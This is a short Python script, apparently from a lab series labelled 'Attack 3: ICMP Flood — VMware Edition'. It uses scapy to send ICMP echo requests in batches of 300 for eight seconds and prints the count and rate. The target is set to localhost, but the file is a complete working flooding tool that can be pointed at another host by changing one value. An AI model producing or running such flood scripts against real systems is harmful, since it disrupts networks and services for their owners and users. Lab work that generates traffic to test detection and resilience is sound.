#!/usr/bin/env python3
"""
Attack 3: ICMP Flood — VMware Edition
"""
from scapy.all import IP, ICMP, send, conf
import time

conf.verb = 0

TARGET   = "127.0.0.1"
DURATION = 8
BATCH    = 300

print(f"""
╔══════════════════════════════════════╗
║          ICMP FLOOD ATTACK           ║
║  Target  : {TARGET:<27}║
║  Duration: {DURATION} seconds                ║
╚══════════════════════════════════════╝
""")

total = 0
start = time.time()

while time.time() - start < DURATION:
    pkts = [IP(dst=TARGET)/ICMP(type=8) for _ in range(BATCH)]
    send(pkts, verbose=False)
    total += BATCH
    elapsed = time.time() - start
    print(f"  [{elapsed:>4.1f}s]  {total:>7,} pings  "
          f"({total/elapsed:>5,.0f}/s)", end="\r")

print(f"\n\n  Done. {total:,} ICMP echo requests sent.\n")
